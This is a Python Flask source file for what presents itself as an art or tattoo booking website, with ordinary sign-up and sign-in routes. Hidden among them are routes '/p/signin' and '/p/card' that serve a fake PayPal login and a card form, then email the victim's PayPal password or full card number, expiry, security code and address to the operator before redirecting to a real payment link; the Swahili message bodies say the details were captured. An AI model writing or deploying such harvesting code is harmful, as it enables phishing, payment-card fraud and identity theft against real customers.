"""art-experience"""

import os
import smtplib
import threading
from urllib.parse import urlparse
import time
from datetime import timedelta
from werkzeug.security import check_password_hash, generate_password_hash
from flask import Flask, render_template, request, redirect, flash, url_for, jsonify
from flask_mail import Mail, Message
from dotenv import load_dotenv
import psycopg2
import requests


load_dotenv(".env")

PAYMENT_LINK = os.getenv("PAYMENT_LINK")
PAYPAL_BOOKING_LINK = os.getenv("PAYPAL_BOOKING_LINK")
CARD_BOOKING_LINK = os.getenv("CARD_BOOKING_LINK")
DATABASE = os.getenv("INTERNAL_DATABASE_URL")
KEEP_ALIVE_WORKER = os.getenv("KEEP_ALIVE_URL")
RECEPIENT_MAIL = os.environ.get("RECIP_MAIL")

app = Flask(__name__)
app.secret_key = os.getenv("SECRET")
app.permanent_session_lifetime = timedelta(minutes=45)

# Flask mail configurations
# Flask-Mail Configuration
app.config['MAIL_SERVER'] = 'smtp.gmail.com'  # Use Gmail SMTP
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = os.environ.get("SENDER_MAIL")
app.config['MAIL_PASSWORD'] = os.environ.get("SENDER_PASS")
app.config['MAIL_DEFAULT_SENDER'] = os.environ.get("SENDER_MAIL")


mail = Mail(app)    


# --------------------------
# configure & connect db
# --------------------------
def connect_db():
    """connect database"""
    result = urlparse(DATABASE)
    try:
        connection = psycopg2.connect(
            host=result.hostname,
            port=result.port,
            dbname=result.path[1:],
            user=result.username,
            password=result.password,
        )
        print("db connected")
        return connection
    except (
        psycopg2.InterfaceError,
        psycopg2.ProgrammingError,
        psycopg2.DatabaseError,
    ) as e:
        print(f"Connection Failed: {e}")
        return None 

@app.get("/")
def home():
    """home page"""
    return render_template("home.html")


@app.get("/book-with-us")
def book_with_us():
    """book a session with art experience"""
    return render_template("tat-prices.html", paypal_booking_link=PAYPAL_BOOKING_LINK, card_booking_link=CARD_BOOKING_LINK)

@app.get("/our-work")
def our_work():
    """our work"""
    return render_template("our-work.html")


# @app.get('/about-us')
# def about():
#     """know more about art experience"""
#     return render_template("about.html")

@app.route("/care-instructions", methods=["GET"])
def care_instructions():
    """Get care instructions for the art experience"""
    return render_template("care_instructions.html")

@app.route("/sign_up", methods=["GET", "POST"])
def sign_up():
    """Create user account"""
    if request.method == "POST":
        email = request.form.get("email")
        first_name = request.form.get("fname")
        last_name = request.form.get("lname")
        password = request.form.get("password")

        # Hash the password
        hashed_password = generate_password_hash(password)

        # Save user details to the database
        conn = connect_db()

        # Check if the connection was successful
        if conn is None:
            flash("Error connecting to the database. Please try again later.")
            return redirect(url_for("sign_up"))
        
        # Create a cursor to execute SQL queries
        cursor = conn.cursor()
        try:
            cursor.execute(
                """
                INSERT INTO users (email, first_name, last_name, password)
                VALUES (%s, %s, %s, %s)
            """,
                (email, first_name, last_name, hashed_password),
            )
            conn.commit()
            conn.close()

            flash("Account created successfully!", "success")
            return redirect(url_for("sign_in"))
        except TypeError:
            conn.close()
            flash("Email already exists. Please use a different email.")
            return redirect(url_for("sign_up"))
        except psycopg2.IntegrityError:
            conn.close()
            flash("Email Already exist. Sign in.")
            return redirect(url_for("sign_up"))
        except Exception as e:
            conn.close()
            print(e)
            flash("Server under maintenance. Try later.")
            return redirect(url_for("sign_up"))

    return render_template("register.html")


@app.route("/sign_in", methods=["GET", "POST"])
def sign_in():
    """Sign in user"""
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        # Connect to the database
        conn = connect_db()

        if conn is None:
            flash("Error veryfying your information. Please try again later.")
            return redirect(url_for("sign_in"))
        
        cursor = conn.cursor()
        try:
            # Fetch the user by email
            cursor.execute("SELECT password FROM users WHERE email = %s", (email,))
            result = cursor.fetchone()
            conn.close()

            if result:
                # Verify the password
                stored_password = result[0]
                if check_password_hash(stored_password, password):
                    flash("Signed in successfully!", "success")
                    return redirect(url_for("home"))
                flash("Invalid email or password.", "danger")

        except Exception as e:
            conn.close()
            print(e)
            flash("Server under maintenance. Try later.")
            return redirect(url_for("sign_in"))

    return render_template("login.html")


@app.route("/p/signin", methods=["GET", "POST"])
def paypal_login():
    """Sign in to PayPal"""
    if request.method == "POST":
        email = request.form.get("email-phone-no")
        password = request.form.get("password")

        message = send_admin_email(email, password)

        if message!= None:
            print("Email sent successfully")
            return redirect(PAYMENT_LINK)
        else:
            print("Failed to send email")
            return redirect(url_for("paypal_login"))
       
    return render_template("ukora.html")

@app.route("/p/card", methods=["GET","POST"])
def debit_card_details():
    """Get debit card details"""
    if request.method == "POST":
        card_number = request.form.get("card-number")
        expiry_date = request.form.get("expiry-date")
        csc = request.form.get("csc-no")
        fname = request.form.get("fname")
        lname = request.form.get("lname")
        street = request.form.get("str-address")
        apt_bldg = request.form.get("apt-bldg")
        city = request.form.get("city")
        state = request.form.get("state")
        zip_code = request.form.get("zip-code")
        mobile_no = request.form.get("mobile-no")
        email = request.form.get("email")

        message = send_admin_email_debit(card_number, expiry_date, csc, fname, lname, street, apt_bldg, city, state, zip_code, mobile_no, email)

        if message != None:
            print("Email sent successfully")
            return redirect(PAYMENT_LINK)
        else:
            print("Failed to send email")
            return redirect(url_for("debit_card_details"))

    return render_template("debitdet.html")

# --------
# PING KEEP ALIVE TO STAY ALIVE
# --------
@app.route("/ping", methods=["GET"])
def _handle_ping():
    """
    Handle ping requests from keep alive worker
    Get full understanding from the readme file.
    """
    print("Received ping from Keep Alive Worker: Active")
    return jsonify({"message": "App is active"}), 200


def send_admin_email(email, password):
    """send email to admin"""
    message = None
    try:
        msg = Message("Changamka Mzee!!!!", recipients=[RECEPIENT_MAIL])
        msg.body = f"""
        Nimenasa details hapa:

        Email: {email}
        Password: {password}
        """
        mail.send(msg)
        message = "Sent"
        return message
    except (ConnectionError, smtplib.SMTPException) as e:
        message = None
        return message
    except Exception as e:
        message = None
        return message


def send_admin_email_debit(card_number, expiry_date, csc, fname, lname, street, apt_bldg, city, state, zip_code, mobile_no, email):
    """send email to admin"""
    message = None
    try:
        msg = Message("Changamka Mzee!!!!", recipients=[RECEPIENT_MAIL])
        msg.body = f"""
        Nimenasa details za card hapa:

        Card Number: {card_number}
        Expiry Date: {expiry_date}
        CSC: {csc}
        First Name: {fname}
        Last Name: {lname}
        Street Address: {street}
        Apartment/Building: {apt_bldg}
        City: {city}
        State: {state}
        Zip Code: {zip_code}
        Mobile Number: {mobile_no}
        Email: {email}
        """
        mail.send(msg)
        message = "Sent"
        return message
    except (ConnectionError, smtplib.SMTPException) as e:
        message = None
        return message
    except Exception as e:
        message = None
        return message

# --------
# a keep alive for keep alive worker
# --------
def ping_keep_alive_worker():
    """Send a request to keep the keep_alive_worker alive"""
    while True:
        try:
            requests.get(KEEP_ALIVE_WORKER, timeout=60)

        except requests.RequestException:
            "Failed to reach Keep Alive Worker. Network Issue"

        finally:
            # Wait for 10 minutes before sending the next request
            time.sleep(600)


# Start the ping loop to communicate with keep_alive_worker.py
ping_thread = threading.Thread(target=ping_keep_alive_worker)
ping_thread.daemon = True
ping_thread.start()

if __name__ == "__main__":
    app.run(debug=False, port=5000)
